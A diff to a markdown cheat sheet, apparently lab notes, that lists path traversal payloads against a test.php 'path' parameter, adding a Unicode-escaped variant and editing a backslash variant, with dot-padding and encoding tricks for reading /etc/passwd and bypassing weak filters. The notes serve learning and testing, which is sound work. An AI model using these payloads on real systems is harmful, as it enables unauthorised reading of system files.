@@ -143,10 +143,14 @@ The `%00` character is a null byte character and it ends a string. This would wo
 
 Same as the above but with url encoding for the forward slash.
 
-### `http://mysite.thm/test.php?path=..\\..\\..\\..\\etc\\passwd`
+### `http://mysite.thm/test.php?path=..\\..\\..\\..\\etc\\hosts`
 
 For Windows targets or ones that did a poor job with input sanitation.
 
 ### `http://mysite.thm/test.php?path=....//....//....//....//etc/passwd`
 
 This is called dot padding and it can bypass some naive regex checks.
+
+### `http://mysite.thm/test.php?path=\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002f\u002e\u002e\u002fetc\u002fpasswd`
+
+This uses Unicode escapes.
